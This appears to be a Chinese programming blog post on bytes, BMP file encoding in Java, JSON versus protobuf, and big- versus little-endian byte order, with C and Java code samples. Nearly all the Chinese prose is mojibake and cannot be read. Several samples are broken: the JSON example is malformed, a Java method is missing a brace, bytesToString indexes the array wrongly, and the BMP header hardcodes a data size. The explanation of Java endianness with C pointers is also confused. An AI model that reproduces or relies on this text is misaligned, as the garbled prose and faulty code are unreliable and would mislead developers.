ä¸ºæ˜¯ç›´æ¥gVimRuntimeè¿›è¡Œè°ƒç”¨gVMRuntime_newNonMovableArrayæ¥åˆ›å»ºçš„ï¼Œå¹¶ä¸ä¼šå¯¹å¼€å‘è€…æš´éœ²è¿™ä¸ªæ•°ç»„çš„ç›´æ¥å¼•ç”¨(ç›´æ¥ä¹±æ”¹ä¹Ÿä¸å¥½å§)ï¼Œè€Œæ˜¯ä½¿ç”¨bitmapè¿™ä¸ªå¯¹è±¡è¿›è¡Œé—´æ¥æ“ä½œã€‚å®˜æ–¹æ–‡æ¡£å…¶å®ä¹Ÿæ›´æ–°äº†: From Android 3.0 (API level 11) through Android 7.1 (API level 25), the pixel data is stored on the Dalvik heap along with the associated bitmap. In Android 8.0 (API level 26), and higher, the bitmap pixel data is stored in the native heap. 6.æ¥çœ‹ä¸€å¼ å›¾ç‰‡æ˜¯æ€ä¹ˆå†™å‡ºæ¥çš„(åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­)æˆ‘è¿™é‡Œç›´æ¥æŠŠJesse Wilsonçš„ä»£ç å¤åˆ¶è¿‡æ¥ï¼Œå¤§æ„å°±æ˜¯å†™ä¸€ä¸ªbmpæ–‡ä»¶çš„æ–¹æ³•ï¼Œå…ˆå†™æ–‡ä»¶å¤´ï¼Œç„¶åä»é‚£ä¸ªint[][]ä¸­è¯»å–æ•°ç»„ï¼Œå†™è¿›ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±å¾—åˆ°ä¸€ä¸ª.bmpæ–‡ä»¶äº†ã€‚æ–‡ä»¶å°±æ˜¯è¿™ä¹ˆå†™çš„ã€‚ public final class Bitmap { private final int[][] pixels; public Bitmap(int[][] pixels) { this.pixels = pixels; } /** https://en.wikipedia.org/wiki/BMP_file_format */ public void encode(BufferedSink sink) throws IOException { int height = pixels.length; int width = pixels[0].length; int bytesPerPixel = 3; int rowByteCountWithoutPadding = (bytesPerPixel * width); int rowByteCount = ((rowByteCountWithoutPadding + 3) / 4) * 4; int pixelDataSize = rowByteCount * height; int bmpHeaderSize = 14; int dibHeaderSize = 40; // BMP Header sink.writeUtf8(&quot;BM&quot;); // ID. sink.writeIntLe(bmpHeaderSize + dibHeaderSize + pixelDataSize); // File size. sink.writeShortLe(0); // Unused. sink.writeShortLe(0); // Unused. sink.writeIntLe(bmpHeaderSize + dibHeaderSize); // Offset of pixel data. // DIB Header sink.writeIntLe(dibHeaderSize); sink.writeIntLe(width); sink.writeIntLe(height); sink.writeShortLe(1); // Color plane count. sink.writeShortLe(bytesPerPixel * Byte.SIZE); sink.writeIntLe(0); // No compression. sink.writeIntLe(16); // Size of bitmap data including padding. sink.writeIntLe(2835); // Horizontal print resolution in pixels/meter. (72 dpi). sink.writeIntLe(2835); // Vertical print resolution in pixels/meter. (72 dpi). sink.writeIntLe(0); // Palette color count. sink.writeIntLe(0); // 0 important colors. // Pixel data. for (int y = height - 1; y &gt;= 0; y--) { int[] row = pixels[y]; for (int x = 0; x &lt; width; x++) { int pixel = row[x]; sink.writeByte((pixel &amp; 0x0000ff)); // Blue. sink.writeByte((pixel &amp; 0x00ff00) &gt;&gt; 8); // Green. sink.writeByte((pixel &amp; 0xff0000) &gt;&gt; 16); // Red. } // Padding for 4-byte alignment. for (int p = rowByteCountWithoutPadding; p &lt; rowByteCount; p++) { sink.writeByte(0); } } } public void encodeToFile(File file) throws IOException try (BufferedSink sink = Okio.buffer(Okio.sink(file))) { encode(sink); } } è¿™é‡Œæ²¡æœ‰è€ƒè™‘å‹ç¼©ç®—æ³•ã€‚è¿™é‡Œé¢è¿˜æœ‰Big Endingå’ŒSmall Endingçš„å¤„ç†ã€‚Big Endingï¼š æ‹¿32bit ï¼Œä¸€æ¬¡è¯»8bitï¼Œä»å·¦åˆ°å³Little Ending: æ‹¿32bit ,ä¸€æ¬¡è¯»8bitï¼Œä»å³åˆ°å·¦è¯» 7.ä»jsonåˆ°protoBufferä»¥åŠhttp2ä¸€èˆ¬æˆ‘ä»¬çœ‹åˆ°çš„jsonæ˜¯è¿™æ ·çš„ { &quot;price&quot;: 14, &quot;gender&quot;: true, &quot;height&quot;: 1.65, &quot;grade&quot;: null, &quot;time&quot;: ,&quot;2016-09-30T18:30:00Z&quot; } æ³¨æ„é‚£ä¸ªäº‹ä»¶æˆ³ï¼Œæ—¶é—´æˆ³æœ¬å¯ä»¥ç”¨long(8bytes)è¡¨ç¤ºï¼Œè¿™ä¸Šé¢çš„Stringçš„æ¯ä¸ªå­—ç¬¦éƒ½åœ¨è‹±æ–‡æˆ–è€…é˜¿æ‹‰ä¼¯æ•°å­—ï¼Œæ‰€ä»¥åœ¨ASCIIå†…ï¼Œæ‰€ä»¥ä¸€ä¸ªå­—ç¬¦æŒ‰ç…§utf-8ç¼–ç çš„è¯ä¹Ÿå°±1byteï¼Œä¸€ä¸ªä¸ªæ•°ä¸‹æ¥ä¹Ÿæœ‰äºŒåå¤šä¸ªbytesã€‚ä»8bytesåˆ°äºŒåå¤šä¸ªbytesï¼Œæµªè´¹äº†ä¸€åŠå¤šçš„bitsã€‚æ•°æ®é‡è¶Šå¤§ï¼Œç¼–ç è¶Šæ…¢ï¼Œä¼ è¾“è¶Šæ…¢ï¼Œè§£ç è¶Šæ…¢ã€‚ æ¥çœ‹protocolBufferï¼ŒprotocolBufferä¸€èˆ¬é•¿è¿™æ ·ï¼Œæ¯ä¸€ä¸ªfieldéƒ½æœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„tag. message Person { required string name = 1; required int32 id = 2; optional string email = 3; enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2; } message PhoneNumber { required string number = 1; optional PhoneType type = 2 [default = HOME]; } repeated PhoneNumber phone = 4; } ä»¥ optional string email = 3 ä¸ºä¾‹ï¼ŒProtocolBufferå®šä¹‰äº†ä¸€ä¸ªlength modeï¼ˆenum,int32,int64æ˜¯000,fixed64æ˜¯001ï¼ŒString,messageæ˜¯010ï¼‰ï¼Œæ‹¿ä¸€ä¸ªbyteå‡ºæ¥ï¼Œå…ˆæŠŠåé¢ä¸‰ä½å¡«ä¸Š010ï¼Œå³XXXXX010ï¼Œç„¶åæŠŠ3åœ¨å‰é¢ï¼Œå³00011010ï¼Œä¸€å…±åªç”¨äº†ä¸€ä¸ªbyteå°±æŠŠString emailè¿™å¥è¯è¡¨ç¤ºå‡ºæ¥äº†ã€‚å³protobufferåªéœ€ä¸€ä¸ªbyteå°±èƒ½è¡¨ç¤ºkey,åŒæ ·çš„keyï¼Œjsonè¦12byteï¼ˆutf-8ä¸‹ä¸€ä¸ªå­—æ¯ä¸€ä¸ªbyteï¼‰ã€‚valueä¹Ÿæ˜¯ä¸€æ ·ï¼Œè½¬æˆhexçš„å½¢å¼ã€‚å°è±¡ä¸­http2ä¹Ÿæ˜¯ç”¨æ•°å­—æ¥è¡¨ç¤ºheader keyçš„ï¼Œç±»ä¼¼çš„èŠ‚çœæ•°æ®çš„é“ç†ã€‚ jsonæ˜¯æœ‰rfcè§„èŒƒrfc4627çš„ JSON text SHALL be encoded in Unicode. The default encoding is UTF-8. 8. è¡¥å……8.1 Big-endingå’ŒLittle-endianè¿™åå­—å…¶å®è·Ÿæ–‡å­¦ä½œå“æœ‰å…³ Notepad++å¯ä»¥å³ä¸‹è§’å¯ä»¥çœ‹åˆ°å½“å‰æ–‡ä»¶çš„ç¼–ç æ–¹å¼ï¼Œutf-8 domè·Ÿå¾®è½¯æœ‰å…³ï¼Œæœ€å¥½ä¸è¦ç”¨. Pythonå‰é¢å†™çš„â€# -- coding: utf-8 --â€œè·Ÿè¿™äº‹æœ‰å…³,â€#!/usr/bin/pythonâ€æ˜¯ç”¨æ¥è¯´æ˜è„šæœ¬è¯­è¨€æ˜¯pythonçš„ unicodeæ˜¯å­—ç¬¦é›†ï¼Œutf-8æ˜¯ä¸€ç§ç¼–ç å½¢å¼ã€‚ ã€Šæ ¼åˆ—å¤«æ¸¸è®°ã€‹é‡Œé¢ï¼Œåƒé¸¡è›‹å…ˆæ‰“æ‰“å¤´è¿˜æ˜¯å°å¤´è¯¦è§£ æ–‡æ¡£å¤´éƒ¨æ”¾ä¸€ä¸ªBOM (ç”¨æ¥è¡¨ç¤ºè¯¥æ–‡ä»¶çš„å­—èŠ‚åºï¼ŒBOMæ˜¯FFFEæˆ–è€…FEFFï¼Œæ“ä½œç³»ç»Ÿä¹Ÿå°±èƒ½åˆ¤æ–­æ˜¯å¤§ç«¯è¿˜æ˜¯å°ç«¯äº†)å¤§å°ç«¯çš„ä»‹ç» å…¨è§’å’ŒåŠè§’è·ŸGB2312æŠŠä¸€äº›ASCIIé‡Œé¢å·²æœ‰çš„æ‹‰ä¸å­—æ¯åˆç¼–ç äº†ä¸€éæœ‰å…³ã€‚ GB2312 æ˜¯å¯¹ ASCII çš„ä¸­æ–‡æ‰©å±•.åœ¨è¿™äº›ç¼–ç é‡Œï¼Œæˆ‘ä»¬è¿˜æŠŠæ•°å­¦ç¬¦å·ã€ç½—é©¬å¸Œè…Šçš„å­—æ¯ã€æ—¥æ–‡çš„å‡åä»¬éƒ½ç¼–è¿›å»äº†ï¼Œè¿åœ¨ ASCII é‡Œæœ¬æ¥å°±æœ‰çš„æ•°å­—ã€æ ‡ç‚¹ã€å­—æ¯éƒ½ç»Ÿç»Ÿé‡æ–°ç¼–äº†ä¸¤ä¸ªå­—èŠ‚é•¿çš„ç¼–ç ï¼Œè¿™å°±æ˜¯å¸¸è¯´çš„â€å…¨è§’â€å­—ç¬¦ï¼Œè€ŒåŸæ¥åœ¨127å·ä»¥ä¸‹çš„é‚£äº›å°±å«â€åŠè§’â€å­—ç¬¦äº†ã€‚ å¤§ç«¯å°ç«¯æ²¡æœ‰è°ä¼˜è°åŠ£ï¼Œå„è‡ªä¼˜åŠ¿ä¾¿æ˜¯å¯¹æ–¹åŠ£åŠ¿ å¤§å°ç«¯çš„åº”ç”¨ windowsè®°äº‹æœ¬ä¼šå¼ºè¡Œç»™utf-8åŠ ä¸Šbomï¼Œä¸»è¦æ˜¯ä¸ºäº†å…¼å®¹æ—§ç‰ˆæœ¬ç³»ç»Ÿã€‚BOMå°±æ˜¯ï¼ˆâ€œFE FFâ€ï¼‰è¿™ä¹ˆå‡ ä¸ªäºŒè¿›åˆ¶ï¼Œnotepad++éœ€è¦è£…æ’ä»¶æ‰èƒ½çœ‹äºŒè¿›åˆ¶ï¼Œæ¯”è¾ƒå¥½çš„è§£é‡Šçœ‹è¿™ç¯‡.ç›´æ¥ç”¨InputStreamå¾€æ–‡ä»¶é‡Œå†™byteæ•°ç»„ï¼Œæ¥ç€è¯»å‡ºæ¥ï¼Œç¼–ç ä¸å¯¹å°±æŠ¥é”™ã€‚ å¾ˆå¤šäººéƒ½æœ‰ç”¨è®°äº‹æœ¬ç¼–è¾‘ä»£ç å‡ºé”™çš„ç»å†ï¼Œæ‰€ä»¥å°½é‡ä¸è¦ç”¨windowsä¸‹çš„è®°äº‹æœ¬ç¼–è¾‘ä»£ç ã€‚notepad++é»˜è®¤ä¿å­˜ä¸ºutf-8ä¸å¸¦bomæ ¼å¼ï¼Œæ‰€ä»¥ç¼–è¾‘æ–‡ä»¶æ²¡ä»€ä¹ˆé—®é¢˜ã€‚ åªæœ‰è¯»å–çš„æ—¶å€™ï¼Œæ‰å¿…é¡»åŒºåˆ†å­—èŠ‚åºï¼Œå…¶ä»–æƒ…å†µéƒ½ä¸ç”¨è€ƒè™‘ã€‚å­—èŠ‚åºæŒ‡çš„æ˜¯å¤šå­—èŠ‚çš„æ•°æ®åœ¨å†…å­˜ä¸­çš„å­˜æ”¾é¡ºåºåœ¨ä¸€ä¸ª32ä½çš„CPUä¸­â€œå­—é•¿â€ä¸º32ä¸ªbitï¼Œä¹Ÿå°±æ˜¯4ä¸ªbyteã€‚åœ¨è¿™æ ·çš„CPUä¸­ï¼Œæ€»æ˜¯ä»¥4å­—èŠ‚å¯¹é½çš„æ–¹å¼æ¥è¯»å–æˆ–å†™å…¥å†…å­˜ï¼Œé‚£ä¹ˆåŒæ ·è¿™4ä¸ªå­—èŠ‚çš„æ•°æ®æ˜¯ä»¥ä»€ä¹ˆé¡ºåºä¿å­˜åœ¨å†…å­˜ä¸­çš„å‘¢ï¼Ÿä¾‹å¦‚ï¼Œç°åœ¨æˆ‘ä»¬è¦å‘å†…å­˜åœ°å€ä¸ºaçš„åœ°æ–¹å†™å…¥æ•°æ®0x0A0B0C0Dï¼Œé‚£ä¹ˆè¿™4ä¸ªå­—èŠ‚åˆ†åˆ«è½åœ¨å“ªä¸ªåœ°å€çš„å†…å­˜ä¸Šå‘¢ï¼Ÿè¿™å°±æ¶‰åŠåˆ°å­—èŠ‚åºçš„é—®é¢˜äº†ã€‚ç½‘ç»œå­—èŠ‚åºï¼šTCP/IPå„å±‚åè®®å°†å­—èŠ‚åºå®šä¹‰ä¸º Big Endianï¼Œå› æ­¤TCP/IPåè®®ä¸­ä½¿ç”¨çš„å­—èŠ‚åºæ˜¯å¤§ç«¯åºã€‚ä¸»æœºå­—èŠ‚åºï¼šæ•´æ•°åœ¨å†…å­˜ä¸­å­˜å‚¨çš„é¡ºåºï¼Œç°åœ¨ Little Endian æ¯”è¾ƒæ™®éã€‚ï¼ˆä¸åŒçš„ CPU æœ‰ä¸åŒçš„å­—èŠ‚åºï¼‰C/C++è¯­è¨€ç¼–å†™çš„ç¨‹åºé‡Œæ•°æ®å­˜å‚¨é¡ºåºæ˜¯è·Ÿç¼–è¯‘å¹³å°æ‰€åœ¨çš„CPUç›¸å…³çš„ï¼Œè€Œç°åœ¨æ¯”è¾ƒæ™®éçš„ x86 å¤„ç†å™¨æ˜¯ Little EndianJAVAç¼–å†™çš„ç¨‹åºåˆ™å”¯ä¸€é‡‡ç”¨ Big Endian æ–¹å¼æ¥å­˜å‚¨æ•°æ® ä¸€èˆ¬æ“ä½œç³»ç»Ÿéƒ½æ˜¯å°ç«¯ï¼Œè€Œé€šè®¯åè®®æ˜¯å¤§ç«¯çš„ã€‚ 4.1 å¸¸è§CPUçš„å­—èŠ‚åº Big Endian : PowerPCã€IBMã€Sun Little Endian : x86ã€DEC ARMæ—¢å¯ä»¥å·¥ä½œåœ¨å¤§ç«¯æ¨¡å¼ï¼Œä¹Ÿå¯ä»¥å·¥ä½œåœ¨å°ç«¯æ¨¡å¼ã€‚ æŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿçš„å­—èŠ‚åº ```python python3 -c &#39;import sys; print(repr(sys.byteorder))&#39; System.out.println(ByteOrder.nativeOrder()); macå’Œlinuxä¸Šéƒ½è¾“å‡ºäº†â€˜littleâ€™ cè¯­è¨€ä¸­htonså‡½æ•°å¤„ç†äº†ç«¯å£å·å­—èŠ‚åºï¼Œå°†shortå‹æ•°æ®ä»å½“å‰ä¸»æœºå­—èŠ‚åºè½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åº //åˆ›å»ºsockaddr_inç»“æ„ä½“å˜é‡ struct sockaddr_in serv_addr; memset(&amp;serv_addr, 0, sizeof(serv_addr)); //æ¯ä¸ªå­—èŠ‚éƒ½ç”¨0å¡«å…… serv_addr.sin_family = AF_INET; //ä½¿ç”¨IPv4åœ°å€ serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //å…·ä½“çš„IPåœ°å€ serv_addr.sin_port = htons(1234); //ç«¯å£å· å¸¸è§çš„ç½‘ç»œå­—èŠ‚è½¬æ¢å‡½æ•°æœ‰ï¼šhtons()ï¼šhost to network shortï¼Œå°†shortç±»å‹æ•°æ®ä»ä¸»æœºå­—èŠ‚åºè½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºã€‚ntohs()ï¼šnetwork to host shortï¼Œå°†shortç±»å‹æ•°æ®ä»ç½‘ç»œå­—èŠ‚åºè½¬æ¢ä¸ºä¸»æœºå­—èŠ‚åºã€‚htonl()ï¼šhost to network longï¼Œå°†longç±»å‹æ•°æ®ä»ä¸»æœºå­—èŠ‚åºè½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºã€‚ntohl()ï¼šnetwork to host longï¼Œå°†longç±»å‹æ•°æ®ä»ç½‘ç»œå­—èŠ‚åºè½¬æ¢ä¸ºä¸»æœºå­—èŠ‚åºã€‚ å¦å¤–éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œsockaddr_in ä¸­ä¿å­˜IPåœ°å€çš„æˆå‘˜ä¸º32ä½æ•´æ•°ï¼Œè€Œæˆ‘ä»¬ç†Ÿæ‚‰çš„æ˜¯ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•ï¼Œä¾‹å¦‚ 127.0.0.1ï¼Œå®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ºäº†åˆ†é…IPåœ°å€ï¼Œéœ€è¦å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º4å­—èŠ‚æ•´æ•°ã€‚ inet_addr() å‡½æ•°å¯ä»¥å®Œæˆè¿™ç§è½¬æ¢ã€‚inet_addr() é™¤äº†å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º32ä½æ•´æ•°ï¼ŒåŒæ—¶è¿˜è¿›è¡Œç½‘ç»œå­—èŠ‚åºè½¬æ¢ã€‚ ä¸º sockaddr_in æˆå‘˜èµ‹å€¼æ—¶éœ€è¦æ˜¾å¼åœ°å°†ä¸»æœºå­—èŠ‚åºè½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºï¼Œè€Œé€šè¿‡ write()/send() å‘é€æ•°æ®æ—¶TCPåè®®ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºï¼ˆå¤§ç«¯ï¼‰ï¼Œä¸éœ€è¦å†è°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚ C/C++è¯­è¨€ç¼–å†™çš„ç¨‹åºé‡Œæ•°æ®å­˜å‚¨é¡ºåºæ˜¯è·Ÿç¼–è¯‘å¹³å°æ‰€åœ¨çš„CPUç›¸å…³çš„ï¼Œè€ŒJAVAç¼–å†™çš„ç¨‹åºåˆ™å”¯ä¸€é‡‡ç”¨big endianæ–¹å¼æ¥å­˜å‚¨æ•°æ®ã€‚è¯•æƒ³ï¼Œå¦‚æœä½ ç”¨C/C++è¯­è¨€åœ¨x86å¹³å°ä¸‹ç¼–å†™çš„ç¨‹åºè·Ÿåˆ«äººçš„JAVAç¨‹åºäº’é€šæ—¶ä¼šäº§ç”Ÿä»€ä¹ˆç»“æœï¼Ÿå°±æ‹¿ä¸Šé¢çš„ 0x12345678æ¥è¯´ï¼Œä½ çš„ç¨‹åºä¼ é€’ç»™åˆ«äººçš„ä¸€ä¸ªæ•°æ®ï¼Œå°†æŒ‡å‘0x12345678çš„æŒ‡é’ˆä¼ ç»™äº†JAVAç¨‹åºï¼Œç”±äºJAVAé‡‡å–big endianæ–¹å¼å­˜å‚¨æ•°æ®ï¼Œå¾ˆè‡ªç„¶çš„å®ƒä¼šå°†ä½ çš„æ•°æ®ç¿»è¯‘ä¸º0x78563412ã€‚å› æ­¤ï¼Œåœ¨ä½ çš„Cç¨‹åºä¼ ç»™JAVAç¨‹åºä¹‹å‰æœ‰å¿…è¦è¿›è¡Œå­—èŠ‚åºçš„è½¬æ¢å·¥ä½œã€‚ å¤§å°ç«¯è½¬åŒ–çš„ç®—æ³•åœ¨javaè¿™è¾¹æ˜¯è¿™æ ·çš„å‚è€ƒ /** * å°†intè½¬ä¸ºä½å­—èŠ‚åœ¨å‰ï¼Œé«˜å­—èŠ‚åœ¨åçš„byteæ•°ç»„ (å°ç«¯) * @param n int * @return byte[] */ public static byte[] toLH(int n) { byte[] b = new byte[4]; b[0] = (byte) (n &amp; 0xff); b[1] = (byte) (n &gt;&gt; 8 &amp; 0xff); b[2] = (byte) (n &gt;&gt; 16 &amp; 0xff); b[3] = (byte) (n &gt;&gt; 24 &amp; 0xff); // æŠŠé«˜å­—èŠ‚æ‹¿åˆ°åé¢ return b; } /** * å°†intè½¬ä¸ºé«˜å­—èŠ‚åœ¨å‰ï¼Œä½å­—èŠ‚åœ¨åçš„byteæ•°ç»„ ï¼ˆå¤§ç«¯ï¼‰ * @param n int * @return byte[] */ public static byte[] toHH(int n) { byte[] b = new byte[4]; b[3] = (byte) (n &amp; 0xff); b[2] = (byte) (n &gt;&gt; 8 &amp; 0xff); b[1] = (byte) (n &gt;&gt; 16 &amp; 0xff); b[0] = (byte) (n &gt;&gt; 24 &amp; 0xff); return b; } public static String bytesToString(byte[] b) { StringBuffer result = new StringBuffer(&quot;&quot;); int length = b.length; for (int i=0; i&lt;length; i++) { result.append((char)(b &amp; 0xff)); } return result.toString(); } /** * å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºbyteæ•°ç»„ * @param s String * @return byte[] */ public static byte[] stringToBytes(String s) { return s.getBytes(); } cè¯­è¨€çš„è½¬æ¢å‚è€ƒhtonl() htons() ä»ä¸»æœºå­—èŠ‚é¡ºåºè½¬æ¢æˆç½‘ç»œå­—èŠ‚é¡ºåºntohl() ntohs() ä»ç½‘ç»œå­—èŠ‚é¡ºåºè½¬æ¢ä¸ºä¸»æœºå­—èŠ‚é¡ºåºç”¨cè¯­è¨€æ£€æŸ¥å½“å‰å¹³å°å¤§å°ç«¯ { int i = 1; char *p = (char *)&amp;i; if(*p == 1) printf(&quot;Little Endian&quot;); else printf(&quot;Big Endian&quot;); } å¦‚æœæ˜¯big endiançš„è¯ï¼Œå†…å­˜é‡Œé¢çš„å­˜æ³•æ˜¯ ox00 ox00 ox00 ox01å¦‚æœæ˜¯little endiançš„è¯ï¼Œå†…å­˜é‡Œå­˜çš„æ˜¯ ox01 ox00 ox00 ox00 unionçš„å­˜æ”¾é¡ºåºæ˜¯æ‰€æœ‰æˆå‘˜éƒ½ä»ä½åœ°å€å¼€å§‹å­˜æ”¾ï¼Œåˆ©ç”¨è¯¥ç‰¹æ€§å°±å¯ä»¥è½»æ¾åœ°è·å¾—äº†CPUå¯¹å†…å­˜é‡‡ç”¨Little-endianè¿˜æ˜¯Big-endianæ¨¡å¼è¯»å†™ã€‚ /*return 1: little-endian, return 0: big-endian*/ int checkCPUendian() { union { unsigned int a; unsigned char b; }c; c.a = 1; return (c.b == 1); } å®ç°åŒæ ·çš„åŠŸèƒ½ï¼Œæ¥çœ‹çœ‹Linux æ“ä½œç³»ç»Ÿä¸­ç›¸å…³çš„æºä»£ç æ˜¯æ€ä¹ˆåšçš„ï¼š static union { char c[4]; unsigned long mylong; } endian_test = {{ &#39;l&#39;, &#39;?&#39;, &#39;?&#39;, &#39;b&#39; } }; #define ENDIANNESS ((char)endian_test.mylong) Linux çš„å†…æ ¸ä½œè€…ä»¬ä»…ä»…ç”¨ä¸€ä¸ªunion å˜é‡å’Œä¸€ä¸ªç®€å•çš„å®å®šä¹‰å°±å®ç°äº†ä¸€å¤§æ®µä»£ç åŒæ ·çš„åŠŸèƒ½ï¼ï¼ˆå¦‚æœENDIANNESS=â€™lâ€™è¡¨ç¤ºç³»ç»Ÿä¸ºlittle endianï¼Œä¸ºâ€™bâ€™è¡¨ç¤ºbig endianï¼‰ å¦‚æœåªæ˜¯å­—èŠ‚æµï¼Œä¸éœ€è¦è½¬æ¢ï¼ˆå› ä¸ºç½‘ç»œçš„å­—èŠ‚åºéƒ½æ˜¯å¤§ç«¯ï¼Œåº”ç”¨ç¨‹åºå±‚è¯»åˆ°çš„éƒ½æ˜¯å¤§ç«¯ï¼‰ã€‚ä¸€èˆ¬æ˜¯ipåœ°å€ï¼Œç«¯å£å·ç ï¼Œä¼ è¾“ä¸€äº›æ•´å‹æ•°çš„å‚æ•°ï¼Œæ‰éœ€è¦åšè½¬æ¢ï¼Œå­—èŠ‚æµä¸éœ€è¦ã€‚å¦‚æœå¤´éƒ¨è®°å½•äº†å¤§å°çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªè®°å½•äº†å¤§å°çš„æ•´å‹æ•°éœ€è¦è½¬æ¢ 4.2 å¸¸è§æ–‡ä»¶çš„å­—èŠ‚åºAdobe PS â€“ Big EndianBMP â€“ Little EndianDXF(AutoCAD) â€“ VariableGIF â€“ Little EndianJPEG â€“ Big EndianMacPaint â€“ Big EndianRTF â€“ Little Endianå¦å¤–ï¼ŒJavaå’Œæ‰€æœ‰çš„ç½‘ç»œé€šè®¯åè®®éƒ½æ˜¯ä½¿ç”¨Big-Endiançš„ç¼–ç ã€‚ ### 8.2 è¯»å–ä¸€ä¸ªjsonæ–‡ä»¶ å…ˆç”¨BufferedSourceå°†æ–‡ä»¶å˜æˆä¸€ä¸ªSourceï¼Œå†ç”¨Moshiä»è¿™ä¸ªSourceé‡Œé¢è¯»æ•°æ® ### 8.3 ä»ä¸€ä¸ªbyte[]ä¸­è¯»å–ä¸€ä¸ªintæˆ–è€…å†™ä¸€ä¸ªintå¯ä»¥è¿™æ · åœ¨com.square.tape.QueueFileä¸­çœ‹åˆ° ```java private static int readInt(byte[] buffer, int offset) { return ((buffer[offset] &amp; 0xff) &lt;&lt; 24) + ((buffer[offset + 1] &amp; 0xff) &lt;&lt; 16) + ((buffer[offset + 2] &amp; 0xff) &lt;&lt; 8) + (buffer[offset + 3] &amp; 0xff); } private static void writeInt(byte[] buffer, int offset, int value) { buffer[offset] = (byte) (value &gt;&gt; 24); buffer[offset + 1] = (byte) (value &gt;&gt; 16); buffer[offset + 2] = (byte) (value &gt;&gt; 8); buffer[offset + 3] = (byte) value; } ä¸€ä¸ªintå æ®4ä¸ªå­—èŠ‚ï¼Œæ²¡é—®é¢˜ã€‚ æœ‰ä¸€ä¸ªä¸€ç»´æ•´å‹æ•°ç»„int[]dataä¿å­˜çš„æ˜¯ä¸€å¼ å®½ä¸ºwidthï¼Œé«˜ä¸ºheightçš„å›¾ç‰‡åƒç´ å€¼ä¿¡æ¯ã€‚è¯·å†™ä¸€ä¸ªç®—æ³•ï¼Œå°†è¯¥å›¾ç‰‡æ‰€æœ‰çš„ç™½è‰²ä¸é€æ˜(0xffffffff)åƒç´ ç‚¹çš„é€æ˜åº¦è°ƒæ•´ä¸º50%ã€‚ final int size = data.length; for(int i = 0; i&lt; size; i++){ if(data[i] == 0xffffffff) data[i] = 0x80ffffff; // ARGB_8888 ä¸€ä¸ªåƒç´ å æ®4ä¸ªbytesï¼ŒA(alpha)R(red)G(green)B(blue)ã€‚æ‰€ä»¥åªè¦æ”¹alphaå°±å¥½äº† } æ€»ç»“ è½¯ä»¶å¼€å‘èƒ½å¤Ÿæ¥è§¦åˆ°çš„æœ€å°å•ä½byteå°±æ˜¯8ä¸ªæ’åœ¨ä¸€èµ·çš„å¯ä»¥ç››æ”¾0æˆ–è€…1çš„å°æ§½å­ã€‚ä»60å¹´ä»£çš„ASCIIåˆ°åæ¥çš„utf-8å†åˆ°ä»Šå¤©çš„utf-8ï¼Œæˆç†Ÿçš„ä¸šç•Œæ ‡å‡†ä½¿å¾—è®¡ç®—æœºè¡Œä¸šèƒ½å¤Ÿè·¨è¯­è¨€å½¢æˆä¿¡æ¯å¤„ç†ï¼Œä¼ è¾“ï¼Œæ¶ˆè´¹çš„ç»Ÿä¸€åŒ–ï¼ŒåŒæ—¶å…¼é¡¾äº†æ•ˆç‡ã€‚ å›¾ç‰‡åªæ˜¯æ— æ•°é¢œè‰²çš„ç»„åˆï¼Œç”¨byteè¡¨ç¤ºRGBçš„æ–¹å¼ä½¿å¾—ç”µå­äº§å“æ˜¾ç¤ºå›¾ç‰‡å˜ä¸ºå¯èƒ½ã€‚ åœ¨æ•°æ®ä¼ è¾“ä¸­ï¼Œæ•°æ®ä¼ è¾“åŒæ–¹å¯ä»¥åå•†é‡‡å–åˆç†çš„ä¼ è¾“åè®®ï¼Œè®©é€šä¿¡é‡å˜å¾—å°ï¼Œé€šä¿¡é€Ÿåº¦å˜å¿«ã€‚ hexadecimalç®€åŒ–äº†å†™æ— æ•°ä¸ª01çš„è¿‡ç¨‹ï¼Œæ—¥å¸¸å¼€å‘å°½é‡å†™0xffffffè¿™ç§å½¢å¼ã€‚ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—çš„ç»„åˆé€šå¸¸ä»£è¡¨ä¸€ä¸ªbyteçš„èŒƒå›´ã€‚ æ ¹æ®é˜®ä¸€å³°çš„ä»‹ç»ï¼Œç›®å‰ï¼ŒUnicodeçš„æœ€æ–°ç‰ˆæœ¬æ˜¯7.0ç‰ˆï¼Œä¸€å…±æ”¶å…¥äº†109449ä¸ªç¬¦å·ï¼Œå…¶ä¸­çš„ä¸­æ—¥éŸ©æ–‡å­—ä¸º74500ä¸ªã€‚å¯ä»¥è¿‘ä¼¼è®¤ä¸ºï¼Œå…¨ä¸–ç•Œç°æœ‰çš„ç¬¦å·å½“ä¸­ï¼Œä¸‰åˆ†ä¹‹äºŒä»¥ä¸Šæ¥è‡ªä¸œäºšæ–‡å­—ã€‚ oracleæ–‡æ¡£ä¸Šå°±è¿™ä¹ˆå†™çš„ The Java programming language represents text in sequences of 16-bit code units, using the UTF-16 encoding. javaå†…å­˜ä¸­å­—ç¬¦çš„å­˜å‚¨æ–¹å¼æ˜¯utf-16ï¼Œå› ä¸ºç®€å•å•Šï¼Œä¸ç”¨åƒutf-8é‚£æ ·éº»çƒ¦( random access cannot be done efficiently with UTF-8) 